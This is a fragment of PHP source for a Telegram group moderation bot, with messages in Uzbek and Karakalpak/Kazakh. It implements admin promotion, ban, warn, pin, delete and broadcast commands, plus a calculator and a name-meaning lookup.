    'text'=>"✅ <a href='tg://user?id=$id'>$from_user_first_name</a> sizni tabriklayman , siz guruh <b>adminstratorisiz❗️</b>",
    'parse_mode'=>'html'
  ]);
}

if($text=="/Pmme"&&$fadmin==$admin) {
    bot('promoteChatMember',[
    'chat_id'=>$chat_id,
    'user_id'=>$admin,
    'can_change_info'=>true,
    'can_post_messages'=>false,
    'can_edit_messages'=>false,
    'can_delete_messages'=>true,
    'can_invite_users'=>true,
    'can_restrict_members'=>true,
    'can_pin_messages'=>true,
    'can_promote_members'=>true
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  $ms = bot('sendmessage',[
    'chat_id'=> $chat_id,
    'text'=>"✅",
    'parse_mode'=>'html'
  ]);
    $nat = $ms->result->message_id;
    bot('deleteMessage', [
    'chat_id' => $chat_id,
    'message_id' => $nat,
  ]);
    bot('deleteMessage', [
    'chat_id'=>$chat_id,
    'message_id'=>$mesid
  ]);
}

if($text=="/Pmu"&&$fadmin==$admin) {
    bot('promoteChatMember',[
    'chat_id'=>$chat_id,
    'user_id'=>$id,
    'can_change_info'=>true,
    'can_post_messages'=>false,
    'can_edit_messages'=>false,
    'can_delete_messages'=>true,
    'can_invite_users'=>true,
    'can_restrict_members'=>true,
    'can_pin_messages'=>true,
    'can_promote_members'=>true
  ]);
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  $ms = bot('sendmessage',[
    'chat_id'=> $chat_id,
    'text'=>"✅",
    'parse_mode'=>'html'
  ]);
    $nat = $ms->result->message_id;
    bot('deleteMessage', [
    'chat_id' => $chat_id,
    'message_id' => $nat,
  ]);
    bot('deleteMessage', [
    'chat_id'=>$chat_id,
    'message_id'=>$mesid
  ]);
}

if ($text=="/del"&&$fadmin==$admin) {
   bot('deleteMessage', [
    'chat_id'=>$chat_id,
    'message_id'=>$mesid
  ]);
  bot('deleteMessage', [
    'chat_id'=>$chat_id,
    'message_id'=>$message_id
  ]);
  }

if($text == "/pin" or $text == "Pin" or $text == "/pin" or $text == "/pin@Qarawil24_bot" or $text == "piN" or $text == "pIN" or $text == "pIn" or $text == "pIN"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
  bot('pinChatMessage',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id
  ]);
}
}



if((stripos($mtext,"Sw")!==false) and $fadmin == $admin){
      $sx=explode("\n",$text);
      $matn = $sx[2];
      $idsi  = $sx[1];
  bot('sendMessage',[
       'chat_id'=>$idsi,
       'text'=>$matn,
       'parse_mode'=>'markdown',
       'disable_web_page_preview' => true,
       ]);
   bot('sendMessage',[
       'chat_id'=>$admin,
       'text'=>"✅",
       ]);
  }
  
  if($text == "Leave" or $text == "/leave" or $text== "leave" or  $text == "/leave@Qarawil24_bot"){
  bot('sendmessage', [
      'chat_id' => $chat_id,
      'text' => "<b>Давай Жақсы Жаман Сөзлер Айтсам Үзр!</b>.",
      'parse_mode' => 'html'
  ]);
  bot('leaveChat',[
    'chat_id'=>$chat_id
  ]);
}
  

 if($text == "Del" or $text == "/del" or $text== "del" or  $text == "/del@Qarawil24_bot"){
   bot('deleteMessage', [
    'chat_id'=>$chat_id,
    'message_id'=>$mesid
  ]);
  bot('deleteMessage', [
    'chat_id'=>$chat_id,
    'message_id'=>$message_id
  ]);
  }

 if($text == "/ban" or $text == "Ban" or $text== "/ban@Qarawil24_bot" or  $text == "/ban"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
       $vaqti = strtotime("+108000000 minutes");
      bot('kickChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $id,
        'until_date' => $vaqti,
      ]);
    bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
    bot('sendMessage', [
        'chat_id'=>$chat_id,
        'text' => "🔹 <a href='tg://user?id=$id'>$from_user_first_name</a>  <b>Группадан Бан Болды!</b> ",
        'parse_mode'=>'html'
    ]);
  }
  }

 if($text == "/Unban" or $text == "/unban" or $text== "/unban@Qarawil24_bot" or  $text == "unban"){
$gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
    bot('unbanChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $id,
    ]);
    bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
    bot('sendMessage', [
        'chat_id'=>$chat_id,
        'text' => "🔹 <a href='tg://user?id=$id'>$from_user_first_name</a> <b>Баннан Алынды</b>",
        'parse_mode'=>'html'
    ]);
}
}

 if($text == "/Warn" or $text == "warn" or $text== "/warn@Qarawil24_bot" or  $text == "/warn"){
  $gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
$warn = file_get_contents("warn/$chat_id&$id.dat");
if($warn){
$warn +=1;
file_put_contents("warn/$chat_id&$id.dat","$warn");
if($warn !=3){
  bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
$oldi = bot('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>"⚠ <a href='tg://user?id=$id'>$from_user_first_name</a> <b>Ескертіу Алды.</b>\nЕнді Ескертіулер Саны <b>$warn</b>/3.",
  'parse_mode'=>'html'
  ]);
}else{
 bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
 bot('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>"⚠ <a href='tg://user?id=$id'>$from_user_first_name</a> shu vaqtgacha unga berilgan ogohlantirishlarga <b>befarq bo‘ldi</b>, jazo sifatida esa guruhdan <b>chetlatiladi!</b>",
  'parse_mode'=>'html'
  ]);
 $vaqti = strtotime("+10800000 minutes");
  bot('kickChatMember', [
        'chat_id' => $chat_id,
        'user_id' => $id,
        'until_date' => $vaqti,
      ]);
 $warn = 0;
file_put_contents("warn/$chat_id&$id.dat","$warn");
}
}else{
$warn = 1;
file_put_contents("warn/$chat_id&$id.dat","$warn");
bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>"⚠ <a href='tg://user?id=$id'>$from_user_first_name</a> <b>ogohlantirish oldi.</b>\nEndi undagi ogohlantirishlar soni <b>$warn</b>/3.",
  'parse_mode'=>'html'
  ]);
}
}
}

 if($text == "/unwarn" or $text == "unwarn" or $text== "/unwarn@Qarawil24_bot" or  $text == "/unwarn"){
  $gett = bot('getChatMember', [
'chat_id' => $chat_id,
'user_id' => $fadmin,
]);
$get = $gett->result->status;
if($get =="administrator" or $get == "creator"){
 $warn = 0;
 file_put_contents("warn/$chat_id&$id.dat","$warn");
 bot('sendChatAction',['chat_id'=>$chat_id,'action'=>"typing"]);
  bot('sendmessage',[
  'chat_id'=>$chat_id,
  'text'=>"⚠ <a href='tg://user?id=$id'>$from_user_first_name</a> dan barcha <b>ogohlantirishlar</b> olib tashlandi.\nEndi undagi ogohlantirishlar soni <b>$warn</b>/3.",
  'parse_mode'=>'html'
  ]);
} 
}

$replyik = $message->reply_to_message->text;
    $yubbi = "📨Жіберілетін Хабарды Кіргізің. Хабар Турі Маркдоун!";

    if($text == "/sendu" and $chat_id == $admin){
      ty($chat_id);
      bot('sendMessage',[
      'chat_id'=>$chat_id,
      'text'=>$yubbi,
      ]);
      file_put_contents("stat/$chat_id.step","user");
    }

    if($step == "user" and $chat_id == $admin){
      if($text == "/otmen"){
      file_put_contents("stat/$chat_id.step","");
      }else{ 
      $idszs=explode("\n",$userlar);
      foreach($idszs as $idlat){
     $userr = bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$text,
      'parse_mode'=>'markdown',
      'disable_web_page_preview' => true,
      ]);
      }
        if($userr){
          bot('sendmessage',[
          'chat_id'=>$admin,
          'text'=>"Ағзаларға Жіберілді!",
          ]);      
      file_put_contents("stat/$chat_id.step","");
        }
      }
    }
      
       if($text == "/sendg" and $chat_id == $admin){
      ty($chat_id);
      bot('sendMessage',[
      'chat_id'=>$chat_id,
      'text'=>$yubbi,
      ]);
      file_put_contents("stat/$chat_id.step","guruh");
    }

    if($step == "guruh" and $chat_id == $admin){
      if($text == "/otmen"){
      file_put_contents("stat/$chat_id.step","");
      }else{ 
      $idszs=explode("\n",$guruhlar);
      foreach($idszs as $idlat){
    $guruu =  bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$text,
      'parse_mode'=>'markdown',
      'disable_web_page_preview' => true,
      ]);
      }
        if($guruu){
          bot('sendmessage',[
          'chat_id'=>$admin,
          'text'=>"Группаларға Жіберілді!",
          ]);      
      file_put_contents("stat/$chat_id.step","");
        }
      }
    }
    ////////////////////////////////////////
if(isset($message->new_chat_member) or isset($message->left_chat_member)){
    bot('deleteMessage',[
        'chat_id'=>$message->chat->id,
        'message_id'=>$message->message_id,
    ]);
}

if(isset ($text1)){
$calc = urlencode($text1);
$url = file_get_contents("http://api.mathjs.org/v1/?expr=$calc");
bot('sendmessage',[
    'chat_id'=>$chat_id,
    'reply_to_message_id'=>$mid,
    'text'=>"$url",
    'parse_mode'=>'html'
  ]);
}

if(mb_stripos($text,"/ism") !== false){ 
  $ex=explode(" ",$text);
  $ism = file_get_contents("https://ismlar.com/search/$ex[1]");
  $exp = explode('<p class="text-size-5">',$ism);
  $expl = explode('<div class="col-12 col-md-4 text-md-right">',$exp[1]);
  $im = str_replace($expl[1],' ',$exp[1]);
  $ims = str_replace('</p>',' ',$im);
  $isms = str_replace('</div>',' ',$ims);
  $ismn = str_replace('<div class="col-12 col-md-4 text-md-right">',' ',$isms);
  $ismk = str_replace('&#039;','`',$ismn);
  $ismm = trim("$ismk");
  bot('sendmessage',[
    'chat_id'=>$cid,
    'user_id'=>$uid,
    'reply_to_message_id'=>$mid,
    'text'=>"<b>📚 Атыңыз Мәнісі 📚

🔍 $ex[1]

📑 Мәнісі:</b> <i>$ismm</i>!",
    'parse_mode'=>'html',
  ]);
  }
  ?>
  